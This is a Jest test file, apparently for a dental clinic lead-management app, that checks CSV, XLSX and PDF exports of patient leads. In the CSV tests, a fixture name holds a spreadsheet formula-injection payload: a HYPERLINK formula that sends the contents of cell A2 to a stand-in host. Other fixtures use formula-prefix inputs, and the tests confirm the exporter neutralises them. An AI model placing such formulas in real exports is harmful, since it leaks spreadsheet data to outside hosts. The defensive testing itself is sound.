import { csvCell, type LeadDto } from '@dentaltrack/shared';
import * as ExcelJS from 'exceljs';
import { LeadsExportService } from './leads-export.service';

const LEAD: LeadDto = {
  id: '00000000-0000-0000-0000-00000000a001',
  name: 'João Silva',
  phone: '(11) 90000-0000',
  email: 'joao@exemplo.com',
  interest: 'Implante dentário',
  tags: [{ name: 'implante', color: 'teal' }],
  status: 'agendada',
  source: 'whatsapp',
  createdAt: '2026-06-01T12:00:00.000Z',
  score: 87,
  temperature: 'quente',
  // Lead normal: dados pessoais intactos (P1.5).
  anonymizedAt: null,
};

describe('LeadsExportService', () => {
  const service = new LeadsExportService();

  it('csv: cabeçalho + linha com labels PT-BR e BOM', async () => {
    const file = await service.export([LEAD], 'csv');
    expect(file.contentType).toContain('text/csv');
    expect(file.filename).toMatch(/^leads-\d{4}-\d{2}-\d{2}\.csv$/);
    const text = file.buffer.toString('utf8');
    expect(text.charCodeAt(0)).toBe(0xfeff);
    expect(text).toContain('Nome,Telefone,E-mail');
    expect(text).toContain('João Silva');
    expect(text).toContain('Agendada');
    expect(text).toContain('WhatsApp');
    expect(text).toContain('Quente');
  });

  it('csv: escapa vírgulas e aspas', async () => {
    const file = await service.export(
      [{ ...LEAD, name: 'Silva, "Jr" João' }],
      'csv',
    );
    expect(file.buffer.toString('utf8')).toContain('"Silva, ""Jr"" João"');
  });

  it('csv: nome que começa como fórmula sai como texto', async () => {
    const file = await service.export(
      [{ ...LEAD, name: '=HYPERLINK("http://x.test/?"&A2;"Abrir")' }],
      'csv',
    );
    const text = file.buffer.toString('utf8');
    expect(text).toContain(`"'=HYPERLINK(""http://x.test/?""&A2;""Abrir"")"`);
    expect(text).not.toMatch(/(^|,)=HYPERLINK/m);
  });

  it('xlsx: gera planilha legível pelo exceljs com os dados do lead', async () => {
    const file = await service.export([LEAD], 'xlsx');
    expect(file.contentType).toContain('spreadsheetml');
    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(file.buffer as unknown as ArrayBuffer);
    const sheet = workbook.worksheets[0];
    expect(sheet.name).toBe('Leads');
    expect(sheet.getRow(1).getCell(1).value).toBe('Nome');
    expect(sheet.getRow(2).getCell(1).value).toBe('João Silva');
    expect(sheet.getRow(2).getCell(9).value).toBe('87');
  });

  it('pdf: gera um documento PDF válido (magic bytes) mesmo com muitos leads', async () => {
    const many = Array.from({ length: 60 }, (_, i) => ({
      ...LEAD,
      id: `00000000-0000-0000-0000-0000000${String(1000 + i)}`,
      name: `Paciente ${i + 1}`,
    }));
    const file = await service.export(many, 'pdf', 'Clínica Sorriso');
    expect(file.contentType).toBe('application/pdf');
    expect(file.buffer.subarray(0, 5).toString('latin1')).toBe('%PDF-');
    expect(file.buffer.length).toBeGreaterThan(1000);
  });
});

describe('csvCell (célula de CSV segura para planilha)', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+55 11 90000-0000', "'+55 11 90000-0000"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tcmd', "'\tcmd"],
  ])('%p vira texto', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('\\r no início também é neutralizado, e vai entre aspas', () => {
    expect(csvCell('\r=1')).toBe(`"'\r=1"`);
  });

  it('texto comum passa igual; vírgula e aspas continuam escapadas', () => {
    expect(csvCell('João Silva')).toBe('João Silva');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('Maria=Souza')).toBe('Maria=Souza');
  });
});
